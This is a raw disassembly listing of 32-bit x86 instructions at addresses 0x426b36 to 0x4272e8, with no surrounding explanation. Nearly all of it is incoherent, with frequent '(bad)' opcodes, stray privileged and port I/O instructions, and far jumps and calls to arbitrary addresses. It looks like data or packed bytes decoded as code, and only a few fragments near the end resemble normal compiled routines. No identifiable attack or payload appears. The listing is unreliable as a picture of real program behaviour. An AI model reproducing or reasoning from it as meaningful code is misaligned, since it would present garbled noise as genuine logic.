  426b36:	mov    ch,0x7d
  426b38:	enter  0x3da1,0x11
  426b3c:	loop   0x426b20
  426b3e:	mov    ?,WORD PTR [edi+0x1d]
  426b41:	pusha  
  426b42:	cwde   
  426b43:	lahf   
  426b44:	iret   
  426b45:	lea    esp,[edx+0x73cb33ed]
  426b4b:	add    dh,BYTE PTR [eax-0x77]
  426b4e:	mov    ecx,0x37139bfb
  426b53:	ins    DWORD PTR es:[edi],dx
  426b54:	(bad)  
  426b55:	fmul   QWORD PTR [ebx-0x1b]
  426b58:	push   ds
  426b59:	call   edi
  426b5b:	ret    0x7370
  426b5e:	fwait
  426b5f:	fwait
  426b60:	mov    dl,0x3f
  426b62:	dec    ecx
  426b63:	fnstenv [esi]
  426b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b66:	pop    ss
  426b67:	adc    ebx,ebp
  426b69:	mov    ?,ebx
  426b6b:	mov    fs,WORD PTR [ecx]
  426b6d:	ret    0x2d6d
  426b70:	xchg   edi,eax
  426b71:	sub    BYTE PTR [esi],dh
  426b73:	mov    gs,esp
  426b75:	icebp  
  426b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b77:	pop    es
  426b78:	push   ecx
  426b79:	scas   al,BYTE PTR es:[edi]
  426b7a:	fisubr WORD PTR [eax-0x20]
  426b7d:	dec    ebx
  426b7e:	jb     0x426bf0
  426b80:	mov    ds:0xadfac065,al
  426b85:	nop
  426b86:	sub    cl,0x9e
  426b89:	pop    ebp
  426b8a:	inc    edi
  426b8b:	push   esi
  426b8c:	dec    esp
  426b8d:	inc    edx
  426b8e:	pop    ebp
  426b8f:	pop    edx
  426b90:	dec    edi
  426b91:	push   edi
  426b92:	dec    edx
  426b93:	push   es
  426b94:	enter  0xd281,0xc9
  426b98:	and    DWORD PTR [ecx+0x1f968],edx
  426b9e:	test   DWORD PTR [esi],eax
  426ba0:	add    BYTE PTR [eax],al
  426ba2:	adc    bh,ah
  426ba4:	retf   
  426ba5:	xor    dh,ah
  426ba7:	add    DWORD PTR [ebx],edi
  426ba9:	cld    
  426baa:	lds    edi,FWORD PTR [edx]
  426bac:	adc    eax,0x44dcb8bc
  426bb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426bb2:	les    eax,FWORD PTR ds:0xfa6c613e
  426bb8:	mov    ebp,0xfef7f0d0
  426bbd:	test   DWORD PTR [esi+0x7048a009],ebx
  426bc3:	ds xchg bh,dh
  426bc6:	stos   DWORD PTR es:[edi],eax
  426bc7:	push   0x1ac13a25
  426bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bcd:	adc    DWORD PTR [ebx-0x4eaed6ac],ebp
  426bd3:	mov    ds:0x76935172,eax
  426bd8:	xor    eax,0x289dac03
  426bdd:	jle    0x426c26
  426bdf:	jne    0x426bbf
  426be1:	sbb    bl,BYTE PTR [edx-0x3c7b7717]
  426be7:	sbb    al,0x32
  426be9:	stos   DWORD PTR es:[edi],eax
  426bea:	dec    ebp
  426beb:	popa   
  426bec:	and    esi,ecx
  426bee:	pop    es
  426bef:	mov    dh,0x74
  426bf1:	mov    dl,0x33
  426bf3:	je     0x426c4f
  426bf5:	in     al,0xc9
  426bf7:	add    DWORD PTR ds:0x730b6fc9,edx
  426bfd:	rcl    DWORD PTR [ebp+0x518eab],1
  426c03:	and    ecx,DWORD PTR [eax-0x80]
  426c06:	bound  ebp,QWORD PTR [ebp+0x5d88e71c]
  426c0c:	sub    BYTE PTR [edi-0x5e],ch
  426c0f:	xor    al,0x25
  426c11:	mul    BYTE PTR [esi+0x21]
  426c14:	lock add DWORD PTR [edi],ebp
  426c17:	arpl   WORD PTR [eax+edi*1-0xa],ax
  426c1b:	xchg   edi,eax
  426c1c:	sahf   
  426c1d:	or     edx,DWORD PTR [edi-0x2d4f27be]
  426c23:	jns    0x426bbd
  426c25:	jecxz  0x426c69
  426c27:	xor    eax,0x3a525a67
  426c2c:	ficom  WORD PTR [esi-0x6eb8be49]
  426c32:	cwde   
  426c33:	aam    0xdf
  426c35:	push   0xffffff85
  426c37:	dec    edi
  426c38:	in     eax,0x66
  426c3a:	push   esp
  426c3b:	sar    DWORD PTR [ecx],0x93
  426c3e:	inc    ebx
  426c3f:	iret   
  426c40:	fild   QWORD PTR [edx]
  426c42:	mov    edi,0x4b69f2d0
  426c47:	xlat   BYTE PTR ds:[ebx]
  426c48:	cmp    ah,BYTE PTR [esi]
  426c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c4b:	xor    ecx,esp
  426c4d:	nop
  426c4e:	adc    BYTE PTR [edx-0x49133a86],dh
  426c54:	xchg   esi,eax
  426c55:	arpl   WORD PTR [edx+0x4],sp
  426c58:	pop    ss
  426c59:	and    ecx,ecx
  426c5b:	push   cs
  426c5c:	mov    ch,0xeb
  426c5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c5f:	int    0xe4
  426c61:	adc    dl,BYTE PTR [ebx]
  426c63:	mov    dh,0x7
  426c65:	cmp    DWORD PTR [ebx-0x35],edx
  426c68:	jae    0x426c22
  426c6a:	push   edx
  426c6b:	mov    al,ds:0xb4bb4458
  426c70:	mov    bh,0x6
  426c72:	adc    al,dh
  426c74:	fdivr  st(7),st
  426c76:	inc    edi
  426c77:	int3   
  426c78:	scas   eax,DWORD PTR es:[edi]
  426c79:	fdivr  DWORD PTR [ecx-0x17e0d589]
  426c7f:	(bad)  
  426c81:	js     0x426c5f
  426c83:	les    eax,FWORD PTR [edx+esi*8+0x0]
  426c87:	mov    al,ds:0x3c140e31
  426c8c:	or     esp,edi
  426c8e:	mov    al,0xb3
  426c90:	test   eax,0x8bc3ca5d
  426c95:	or     eax,DWORD PTR [edx-0x261112e6]
  426c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c9c:	mov    edx,0x67b0fdde
  426ca1:	ficom  WORD PTR [edx]
  426ca3:	test   DWORD PTR [eax+0x295cf6a8],ebx
  426ca9:	adc    BYTE PTR [edx+0x26f5dca2],dl
  426caf:	in     al,0x17
  426cb1:	dec    esi
  426cb2:	shl    DWORD PTR [ebp-0x6623a10b],1
  426cb8:	jnp    0x426c50
  426cba:	int3   
  426cbb:	rcr    DWORD PTR [ebx+ecx*8-0x17],cl
  426cbf:	sar    DWORD PTR [eax+eiz*8-0x325ba68c],1
  426cc6:	(bad)  
  426cc8:	inc    ebp
  426cc9:	push   ecx
  426cca:	aaa    
  426ccb:	in     eax,dx
  426ccc:	ret    
  426ccd:	sbb    eax,0xda41fe1c
  426cd2:	xchg   esp,eax
  426cd3:	and    al,0x22
  426cd5:	call   0x732e0cca
  426cda:	pop    es
  426cdb:	mov    eax,0xc1541ce5
  426ce0:	dec    edx
  426ce1:	mov    al,ds:0xdc2d8a6f
  426ce6:	sub    edi,DWORD PTR ss:[eax]
  426ce9:	adc    eax,DWORD PTR [edi+0x1b]
  426cec:	push   ebp
  426ced:	daa    
  426cee:	lock pop edi
  426cf0:	(bad)  
  426cf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cf2:	push   edx
  426cf3:	push   edx
  426cf4:	lea    edi,[edx+0x1d]
  426cf7:	(bad)  
  426cf9:	lea    ebx,[eax]
  426cfb:	cmp    bh,BYTE PTR [esi]
  426cfd:	xor    DWORD PTR [ebx+0x4a],edi
  426d00:	(bad)  
  426d02:	jp     0x426d52
  426d04:	pop    ss
  426d05:	rol    ebp,0x42
  426d08:	call   0x788c2386
  426d0d:	fld    TBYTE PTR [ecx]
  426d0f:	mov    eax,0x7f264f65
  426d14:	clc    
  426d15:	ror    DWORD PTR [eax+ecx*2-0x4464f47],1
  426d1c:	lds    ebx,FWORD PTR [esi+0x10]
  426d1f:	outs   dx,DWORD PTR ds:[esi]
  426d20:	je     0x426caa
  426d22:	cld    
  426d23:	int3   
  426d24:	xor    BYTE PTR ds:[esi],al
  426d27:	inc    edi
  426d28:	mov    WORD PTR [edi],es
  426d2a:	sbb    esp,eax
  426d2c:	inc    esp
  426d2d:	into   
  426d2e:	in     al,0x2a
  426d30:	test   al,0x19
  426d32:	loop   0x426d2d
  426d34:	inc    ecx
  426d35:	xchg   edx,eax
  426d36:	mov    ah,0x6f
  426d38:	out    0x8,eax
  426d3a:	imul   ebx,DWORD PTR [bx]
  426d3e:	jae    0x426ce0
  426d40:	pop    edi
  426d41:	xor    ebp,DWORD PTR [ebx+0x5d]
  426d44:	sub    DWORD PTR [esi+0x7f6d7fb],ebp
  426d4a:	sub    eax,0xe0d5935a
  426d4f:	jg     0x426d4c
  426d51:	add    al,0xb8
  426d53:	es gs fs call 0xe75f1f8c
  426d5b:	jecxz  0x426d75
  426d5d:	inc    edi
  426d5e:	iret   
  426d5f:	xchg   ebx,eax
  426d60:	xchg   edi,eax
  426d61:	and    DWORD PTR [esp+eax*2],edi
  426d64:	fist   WORD PTR [ecx+edi*1]
  426d67:	xor    edi,0x4c79d234
  426d6d:	call   0xafca:0xe84fe66d
  426d74:	imul   BYTE PTR [ecx]
  426d76:	shr    DWORD PTR [eax],0xe2
  426d79:	jmp    0x426dd0
  426d7b:	lock cmp DWORD PTR [eax-0x3977c0bb],esi
  426d82:	mov    al,dl
  426d84:	jecxz  0x426dfb
  426d86:	cmp    BYTE PTR [eax],0xdc
  426d89:	cmc    
  426d8a:	stos   BYTE PTR es:[edi],al
  426d8b:	loopne 0x426d3a
  426d8d:	xchg   edx,eax
  426d8e:	es add cl,bl
  426d91:	sahf   
  426d92:	mov    eax,ds:0x2f6c167a
  426d97:	outs   dx,BYTE PTR ds:[si]
  426d99:	push   ss
  426d9a:	jmp    0x426d92
  426d9c:	adc    ebp,edi
  426d9e:	ret    
  426d9f:	pushf  
  426da0:	retw   0xa4e0
  426da4:	jge    0x426dc8
  426da6:	push   ecx
  426da7:	push   ss
  426da8:	nop
  426da9:	push   ss
  426daa:	pushw  ss
  426dac:	inc    ebp
  426dad:	jns    0x426e2c
  426daf:	rol    BYTE PTR [ebp-0x69],1
  426db2:	or     BYTE PTR [eax-0x8],dh
  426db5:	int    0x6b
  426db7:	mov    gs,WORD PTR [esi-0x4]
  426dba:	retf   0x8fba
  426dbd:	outs   dx,DWORD PTR ds:[esi]
  426dbe:	cs or  ch,cl
  426dc1:	jbe    0x426e1e
  426dc3:	push   ecx
  426dc4:	push   ss
  426dc5:	imul   ebp,DWORD PTR [ebp-0x7a],0x56
  426dc9:	imul   BYTE PTR [ecx-0x70d16874]
  426dcf:	mov    esi,0x8d66a869
  426dd4:	sbb    edi,DWORD PTR [edx+ecx*4+0x41]
  426dd8:	adc    eax,0xc9b21030
  426ddd:	stos   BYTE PTR es:[edi],al
  426dde:	adc    al,0x4b
  426de0:	adc    al,BYTE PTR [eax]
  426de2:	xor    al,0x25
  426de4:	jnp    0x426d77
  426de6:	dec    edx
  426de7:	(bad)  
  426de8:	sbb    DWORD PTR [eax-0x53],esi
  426deb:	jne    0x426dee
  426ded:	cmp    al,0x5e
  426def:	mov    eax,ds:0x693e06c0
  426df4:	faddp  st(0),st
  426df6:	pop    es
  426df7:	call   0xee99c72d
  426dfc:	dec    edx
  426dfd:	ss repnz out dx,eax
  426e00:	mov    edx,0x7fb65249
  426e05:	cwde   
  426e06:	jno    0x426e62
  426e08:	mov    bl,0x3d
  426e0a:	cmp    bl,dl
  426e0c:	in     eax,0x4c
  426e0e:	mov    DWORD PTR [bp+si],esp
  426e11:	add    eax,0x373fea97
  426e16:	xor    bl,dh
  426e18:	push   ebp
  426e19:	mov    ds:0x9666769d,eax
  426e1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e1f:	call   0x7a2b05e0
  426e24:	ins    DWORD PTR es:[edi],dx
  426e25:	loopne 0x426df7
  426e27:	mov    ch,0x40
  426e29:	adc    eax,0xdf2094f0
  426e2e:	push   ds
  426e2f:	(bad)  
  426e30:	xchg   ebp,eax
  426e31:	xchg   edi,eax
  426e32:	rcl    BYTE PTR [ebp+0x409123a9],cl
  426e38:	sub    dl,ah
  426e3a:	push   0x19232ba
  426e3f:	stc    
  426e40:	dec    ebp
  426e41:	out    dx,eax
  426e42:	inc    di
  426e44:	hlt    
  426e45:	retf   
  426e46:	(bad)  
  426e47:	in     eax,dx
  426e48:	push   edx
  426e49:	cmp    BYTE PTR [ebx],0x57
  426e4c:	shl    BYTE PTR [eax],1
  426e4e:	mov    eax,ds:0x591caa19
  426e53:	jmp    0x426df9
  426e55:	test   BYTE PTR [edi-0x954c95f],al
  426e5b:	or     eax,esi
  426e5d:	mov    eax,0xebf80603
  426e62:	mov    ecx,0x4cf593c
  426e67:	icebp  
  426e68:	out    0xab,al
  426e6a:	mov    ebx,0x8a4de390
  426e6f:	mov    cl,0xec
  426e71:	out    dx,al
  426e72:	or     eax,0xecf871e2
  426e77:	rol    BYTE PTR [edx-0x61],0x63
  426e7b:	inc    ecx
  426e7c:	icebp  
  426e7d:	inc    esp
  426e7e:	xchg   ecx,eax
  426e7f:	dec    esi
  426e80:	adc    eax,0x6d496c10
  426e85:	cmp    BYTE PTR [esi],ch
  426e87:	iret   
  426e88:	stos   DWORD PTR es:[edi],eax
  426e89:	iret   
  426e8a:	sbb    cl,dl
  426e8c:	inc    ecx
  426e8d:	ins    BYTE PTR es:[edi],dx
  426e8e:	adc    al,0x82
  426e90:	xchg   ebp,esi
  426e92:	push   esp
  426e93:	cmp    eax,0xa69f6c39
  426e98:	mov    edx,0xe0a57eed
  426e9d:	xor    BYTE PTR [edx+0x5ae003af],cl
  426ea3:	daa    
  426ea4:	xchg   BYTE PTR ds:0x358ea881,ch
  426eaa:	bound  edi,QWORD PTR [ebp-0x3a8a2dc9]
  426eb0:	stos   BYTE PTR es:[edi],al
  426eb1:	fldenv [ebx]
  426eb3:	scas   eax,DWORD PTR es:[edi]
  426eb4:	dec    ecx
  426eb5:	inc    edi
  426eb6:	imul   edi,esp,0x7c
  426eb9:	das    
  426eba:	iret   
  426ebb:	add    cl,dh
  426ebd:	dec    eax
  426ebe:	mul    BYTE PTR [edx]
  426ec0:	call   0xee151529
  426ec5:	push   esp
  426ec6:	cmp    bh,ah
  426ec8:	das    
  426ec9:	mov    ah,BYTE PTR [edi-0x1909f834]
  426ecf:	repnz mov DWORD PTR [eax],ebp
  426ed2:	xchg   edi,eax
  426ed3:	mov    dl,0x89
  426ed5:	adc    ebp,DWORD PTR [ecx-0x47]
  426ed8:	push   ebp
  426ed9:	sub    eax,0x84470fa2
  426ede:	je     0x426f06
  426ee0:	lods   al,BYTE PTR ds:[esi]
  426ee1:	loopne 0x426f52
  426ee3:	fidivr WORD PTR [ebp+0x5453ef58]
  426ee9:	jmp    0x3fcc:0x23681176
  426ef0:	(bad)  
  426ef1:	shl    DWORD PTR [edi-0x76486b4d],1
  426ef7:	inc    esi
  426ef8:	xor    dl,BYTE PTR [esi+edi*1]
  426efb:	mov    ds:0xc4d60f9c,al
  426f00:	ins    BYTE PTR es:[edi],dx
  426f01:	arpl   WORD PTR [ebp+0x503ecbfc],dx
  426f07:	in     eax,0xd3
  426f09:	jnp    0x426eec
  426f0b:	jg     0x426ecc
  426f0d:	cmc    
  426f0e:	scas   eax,DWORD PTR es:[edi]
  426f0f:	test   eax,0x530a26b6
  426f14:	mov    bh,0xaa
  426f16:	arpl   WORD PTR [esp+eax*4+0x59],di
  426f1a:	fild   WORD PTR [esi-0x11]
  426f1d:	push   ebx
  426f1e:	mov    edx,0xcf997a02
  426f23:	jl     0x426f19
  426f25:	rcr    DWORD PTR [eax+0x7a],0xe2
  426f29:	pushf  
  426f2a:	adc    esi,ecx
  426f2c:	rol    DWORD PTR [edx-0x3ff3d88e],0x59
  426f33:	fucom  st(4)
  426f35:	std    
  426f36:	xchg   esp,eax
  426f37:	arpl   WORD PTR [eax-0x7d],si
  426f3a:	popf   
  426f3b:	inc    ebx
  426f3c:	sar    DWORD PTR [edx],cl
  426f3e:	jae    0x426f2b
  426f40:	je     0x426f3a
  426f42:	pop    ss
  426f43:	retf   
  426f44:	outs   dx,DWORD PTR ds:[esi]
  426f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f46:	adc    DWORD PTR [esi+0x55],0x2b
  426f4a:	imul   ebp,DWORD PTR [esi+0x45bada2],0xffffffa4
  426f51:	(bad)  
  426f52:	push   ebx
  426f53:	outs   dx,DWORD PTR ds:[esi]
  426f54:	stos   BYTE PTR es:[edi],al
  426f55:	or     ah,BYTE PTR [ebp-0x36]
  426f58:	dec    esp
  426f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f5a:	addr16 out 0xd2,al
  426f5d:	outs   dx,BYTE PTR ds:[esi]
  426f5e:	rol    esp,cl
  426f60:	add    DWORD PTR [eax+0xc],ebx
  426f63:	ret    0x9ed4
  426f66:	push   ds
  426f67:	cdq    
  426f68:	pop    eax
  426f69:	in     al,0x65
  426f6b:	xor    BYTE PTR [eax],0x90
  426f6e:	cs mov al,0xbf
  426f71:	iret   
  426f72:	ja     0x426f07
  426f74:	dec    esi
  426f75:	mov    ebp,0x47d0abd5
  426f7a:	adc    DWORD PTR [ebp-0x15efd289],ecx
  426f80:	rcr    BYTE PTR [esi],cl
  426f82:	mov    esp,0xe0c31b6b
  426f87:	nop
  426f88:	dec    edi
  426f89:	dec    esp
  426f8a:	aam    0x60
  426f8c:	std    
  426f8d:	fnstcw WORD PTR [esi+0x4c]
  426f90:	inc    ecx
  426f91:	jne    0x426f1a
  426f93:	mov    bh,0x54
  426f95:	xchg   ecx,eax
  426f96:	or     DWORD PTR [eax-0x59],0xffffffab
  426f9a:	cmp    al,0xff
  426f9c:	jecxz  0x427007
  426f9e:	xchg   edx,eax
  426f9f:	out    0x60,al
  426fa1:	shr    al,cl
  426fa3:	addr16 jbe 0x426fdf
  426fa6:	add    DWORD PTR [esi-0x3d],esi
  426fa9:	push   esp
  426faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fab:	sub    al,0x39
  426fad:	loopne 0x426fcd
  426faf:	mov    eax,0xb84b9c71
  426fb4:	xor    DWORD PTR [ebx+0x49a5d964],edi
  426fba:	div    DWORD PTR [eax]
  426fbc:	mov    eax,ds:0x59d7b326
  426fc1:	and    DWORD PTR [esp+ecx*1],0xd49a4272
  426fc8:	test   eax,0x6587626e
  426fcd:	or     edx,DWORD PTR ds:0x9e38
  426fd2:	inc    edi
  426fd3:	or     eax,0xe86ce1e0
  426fd8:	(bad)
  426fdc:	icebp  
  426fdd:	mov    ebx,0x89263956
  426fe2:	jp     0x42701a
  426fe4:	aad    0x8b
  426fe6:	div    ebx
  426fe8:	push   ebx
  426fe9:	fnstsw WORD PTR [esi]
  426feb:	jns    0x426f83
  426fed:	scas   al,BYTE PTR es:[edi]
  426fee:	fld    QWORD PTR [ecx+esi*2-0x14]
  426ff2:	sbb    esi,DWORD PTR ds:0xa3eecb0a
  426ff8:	fidiv  WORD PTR [ebx]
  426ffa:	test   DWORD PTR [edi+0x63],ebp
  426ffd:	inc    esi
  426ffe:	enter  0x386e,0x39
  427002:	lods   eax,DWORD PTR ds:[esi]
  427003:	jb     0x427080
  427005:	and    edx,DWORD PTR [ebx]
  427007:	test   DWORD PTR [eax+0x5b4de705],edi
  42700d:	std    
  42700e:	add    BYTE PTR [ebp-0x9191072],al
  427014:	ret    0x680f
  427017:	mov    ds:0x3d22307e,eax
  42701c:	or     ebp,DWORD PTR [eax+0x12c16d27]
  427022:	in     eax,0xe8
  427024:	adc    al,0x82
  427027:	int3   
  427028:	rcl    DWORD PTR [esp+edi*8],1
  42702b:	adc    eax,0xbc12ea7d
  427030:	jb     0x427036
  427032:	inc    eax
  427033:	inc    eax
  427034:	or     al,0xc0
  427036:	outs   dx,DWORD PTR ss:[esi]
  427038:	stos   BYTE PTR es:[edi],al
  427039:	inc    ecx
  42703a:	je     0x427046
  42703c:	mov    eax,0x19ef73da
  427041:	mov    cs,WORD PTR [ebx]
  427043:	paddw  mm4,QWORD PTR [edx+0x41d66974]
  42704a:	ror    BYTE PTR [eax-0x40245091],cl
  427050:	dec    bp
  427052:	ror    BYTE PTR [esi-0x1199d2fa],0x27
  427059:	mov    eax,ds:0xdcd4dc36
  42705e:	shr    DWORD PTR ss:[eax+0x56f81124],0xe7
  427066:	sub    ch,BYTE PTR [ecx]
  427068:	mov    bh,0xb8
  42706a:	int3   
  42706b:	jl     0x427045
  42706d:	ss mov cl,0xf1
  427070:	inc    ebx
  427071:	pushf  
  427072:	or     eax,0xe7715aa5
  427077:	add    eax,0x31f6eab7
  42707c:	fs test eax,0x70e4ce50
  427082:	fidivr DWORD PTR [ecx-0x58]
  427085:	(bad)  
  427086:	ss xor al,0x7
  427089:	jmp    0xcb39:0x71002ba0
  427090:	fwait
  427091:	cmp    edx,esi
  427093:	cmp    eax,0x335cd020
  427098:	jae    0x4270b9
  42709a:	or     cl,BYTE PTR [esi+edx*8-0x70345326]
  4270a1:	out    dx,al
  4270a2:	scas   al,BYTE PTR es:[edi]
  4270a3:	pop    esi
  4270a4:	jg     0x4270e8
  4270a6:	xor    edi,DWORD PTR [ecx]
  4270a8:	mov    edx,0x35898814
  4270ad:	sbb    dl,0x52
  4270b0:	and    BYTE PTR [ebp-0x42],ch
  4270b3:	dec    esp
  4270b4:	mov    ebx,DWORD PTR [esp+ebp*2+0x37]
  4270b8:	(bad)  
  4270ba:	push   esp
  4270bb:	pushf  
  4270bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270bd:	jecxz  0x427122
  4270bf:	mov    ds:0x666a9615,eax
  4270c4:	inc    edi
  4270c5:	jae    0x4270ef
  4270c7:	(bad)  
  4270c8:	adc    eax,0x70da1595
  4270cd:	loopne 0x4270a4
  4270cf:	adc    cl,ch
  4270d1:	inc    ebp
  4270d2:	mov    ds:0xf313e360,eax
  4270d7:	sbb    bh,BYTE PTR [ecx-0x60b4538a]
  4270dd:	lods   al,BYTE PTR ds:[esi]
  4270de:	jnp    0x4270bb
  4270e0:	ja     0x4270b7
  4270e2:	(bad)  
  4270e3:	cmp    BYTE PTR [eax],ch
  4270e5:	adc    al,0x11
  4270e7:	lock retf 0x7314
  4270eb:	pop    edx
  4270ec:	popa   
  4270ed:	loopne 0x4270bc
  4270ef:	mov    gs,esp
  4270f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270f2:	mov    ds:0x42dca7bf,al
  4270f7:	je     0x427133
  4270f9:	cwde   
  4270fa:	jl     0x4270b5
  4270fc:	pushf  
  4270fd:	xchg   edi,eax
  4270fe:	adc    dl,BYTE PTR [ecx+0x44]
  427101:	and    bh,BYTE PTR [edi+0x50]
  427104:	jbe    0x4270bb
  427106:	pop    eax
  427107:	je     0x42715b
  427109:	lods   eax,DWORD PTR ds:[esi]
  42710a:	aaa    
  42710b:	repnz xlat BYTE PTR ds:[ebx]
  42710d:	cmp    DWORD PTR [ebp+0x124d4fb6],eax
  427113:	dec    edx
  427114:	adc    esp,edx
  427116:	shl    BYTE PTR [eax+ebp*1+0x57],cl
  42711a:	and    al,0x42
  42711c:	std    
  42711d:	jnp    0x427187
  42711f:	jae    0x427101
  427121:	test   al,0xba
  427123:	jl     0x4270a7
  427125:	or     DWORD PTR [edi],0x181e0eb3
  42712b:	xchg   edi,eax
  42712c:	mov    ch,0x71
  42712e:	mov    edx,0xd497c30e
  427133:	pushf  
  427134:	xor    edx,DWORD PTR [ebp+edx*1-0x36b5cbe2]
  42713b:	pop    esp
  42713c:	mov    ecx,0x361cbf0c
  427141:	jbe    0x427133
  427143:	sar    ebp,cl
  427145:	call   0x1322646f
  42714a:	or     al,0x7c
  42714c:	dec    edi
  42714d:	pop    ss
  42714e:	rcl    bh,1
  427150:	adc    DWORD PTR [ebx],eax
  427152:	jo     0x427149
  427154:	mov    dl,0x78
  427156:	out    0xa6,al
  427158:	adc    eax,0xb93b3af2
  42715d:	cmp    BYTE PTR [edi],bh
  42715f:	mov    WORD PTR ds:0xcf7c3edc,ds
  427165:	push   0x5a
  427167:	scas   eax,DWORD PTR es:[edi]
  427168:	mov    dl,0xaf
  42716a:	or     eax,0x816b5c8a
  42716f:	call   0x2193:0x6803cc7
  427176:	test   eax,0x6914f929
  42717b:	cwde   
  42717c:	adc    al,0xb0
  42717e:	stos   BYTE PTR es:[edi],al
  42717f:	das    
  427180:	scas   al,BYTE PTR es:[edi]
  427181:	pusha  
  427182:	sub    BYTE PTR [edx+0x3a0d5394],ah
  427188:	test   al,0xca
  42718a:	out    0xb0,eax
  42718c:	nop
  42718d:	icebp  
  42718e:	aam    0x60
  427190:	xchg   edx,eax
  427191:	sbb    eax,0x27dcdeda
  427196:	es cli 
  427198:	fs cmc 
  42719a:	xchg   esp,eax
  42719b:	and    eax,0x5874e690
  4271a0:	sub    BYTE PTR [ebx-0x5e],ah
  4271a3:	jno    0x42716c
  4271a5:	push   ebp
  4271a6:	fistp  DWORD PTR [edx-0x6393f0f6]
  4271ac:	test   ch,ah
  4271ae:	fistp  DWORD PTR [ecx+0xaec8cf1]
  4271b4:	not    BYTE PTR [ebp-0x7a]
  4271b7:	cs pop edx
  4271b9:	pop    esp
  4271ba:	xchg   BYTE PTR [ebx],al
  4271bc:	pop    esi
  4271bd:	push   esp
  4271be:	fwait
  4271bf:	fwait
  4271c0:	rcr    BYTE PTR [eax-0x4a],0x24
  4271c4:	jb     0x427245
  4271c6:	loopne 0x4271cc
  4271c8:	or     al,0xd0
  4271ca:	add    bh,BYTE PTR [esi+0x72]
  4271cd:	les    eax,FWORD PTR [ebp+0x6d]
  4271d0:	xchg   ebx,eax
  4271d1:	inc    ecx
  4271d2:	xchg   esp,eax
  4271d3:	sub    ebp,DWORD PTR [esp+ebp*4]
  4271d6:	pop    edx
  4271d7:	neg    BYTE PTR [edx+0x74]
  4271da:	fadd   st,st(2)
  4271dc:	sbb    eax,0x4122f429
  4271e1:	(bad)  
  4271e2:	mov    esp,0x3d99da20
  4271e7:	cmp    eax,0xaedb0ebe
  4271ec:	xchg   DWORD PTR cs:[edi-0x5db7391f],esp
  4271f3:	dec    ecx
  4271f4:	jecxz  0x4271e6
  4271f6:	or     BYTE PTR [esp+ebx*4],0x3
  4271fa:	pop    es
  4271fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271fc:	inc    esi
  4271fd:	mov    edx,0x97db45f5
  427202:	push   ds
  427203:	jne    0x427228
  427205:	pop    es
  427206:	sbb    ebp,DWORD PTR [edi-0x40]
  427209:	pop    edx
  42720a:	sbb    eax,0x1b36070
  42720f:	sar    DWORD PTR [esi],0x69
  427212:	or     ebx,DWORD PTR [si-0xa7c]
  427217:	push   edx
  427218:	jecxz  0x4271c4
  42721a:	ins    DWORD PTR es:[edi],dx
  42721b:	(bad)  
  42721c:	adc    ebp,DWORD PTR [esp+ebx*8-0x6c]
  427220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427221:	imul   esp,DWORD PTR [esi],0x3f
  427224:	inc    esp
  427225:	jmp    0x554d:0xed
  42722c:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  427232:	mov    esp,ebp
  427234:	or     al,ah
  427236:	dec    ebp
  427237:	add    bh,al
  427239:	add    BYTE PTR [eax],cl
  42723b:	add    BYTE PTR [eax],al
  42723d:	mov    DWORD PTR [eax],0x3ef44545
  427243:	cmp    BYTE PTR [eax],al
  427245:	test   DWORD PTR [ebx-0x34070b64],ecx
  42724b:	(bad)  
  42724c:	enter  0x4d45,0xb8
  427250:	mov    edi,DWORD PTR [ecx]
  427252:	hlt    
  427253:	test   ebx,ecx
  427255:	pushf  
  427256:	enter  0x4df8,0x8b
  42725a:	mov    DWORD PTR [ebp+0x8],0x894708
  427261:	inc    ebp
  427262:	mov    ebp,0xff8bfffc
  427267:	dec    ebp
  427268:	mov    ch,0xf4
  42726a:	call   DWORD PTR [ebx-0x1]
  42726d:	mov    ebx,0x8005022
  427272:	call   DWORD PTR [ecx+0x8]
  427275:	pop    es
  427276:	jmp    0xb8:0x9cb4533
  42727d:	cwde   
  42727e:	mov    esi,DWORD PTR [edx-0xc]
  427281:	xor    al,bl
  427283:	add    BYTE PTR [eax+0x3c83203],bl
  427289:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  42728f:	mov    eax,DWORD PTR [ebx-0xb87b3]
  427295:	xor    eax,DWORD PTR [eax]
  427297:	retf   
  427298:	ret    
  427299:	add    eax,esi
  42729b:	enter  0x8945,0x64
  42729f:	dec    ebp
  4272a0:	sbb    ah,cl
  4272a2:	add    BYTE PTR [ebx-0xb87b277],cl
  4272a8:	dec    DWORD PTR [ebx-0xbcfb275]
  4272ae:	test   DWORD PTR [ebx],esi
  4272b0:	dec    ebx
  4272b2:	inc    DWORD PTR [ebx]
  4272b4:	inc    eax
  4272b5:	enter  0x8989,0x64
  4272b9:	(bad)  
  4272ba:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4272be:	cld    
  4272bf:	dec    DWORD PTR [ebp-0xa90001]
  4272c5:	push   edi
  4272c6:	mov    BYTE PTR [edx+0x1],ch
  4272c9:	and    BYTE PTR [eax],al
  4272cb:	pop    ecx
  4272cc:	inc    ebp
  4272cd:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4272d3:	push   0xffffff89
  4272d5:	pop    ecx
  4272d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272d7:	dec    ebp
  4272d8:	add    BYTE PTR [ecx+0x45fc088b],cl
  4272de:	jne    0x427328
  4272e0:	lea    eax,[eax]
  4272e2:	fs (bad) 
  4272e4:	dec    DWORD PTR [eax]
  4272e6:	mov    DWORD PTR [eax],eax
  4272e8:	test   al,0x0
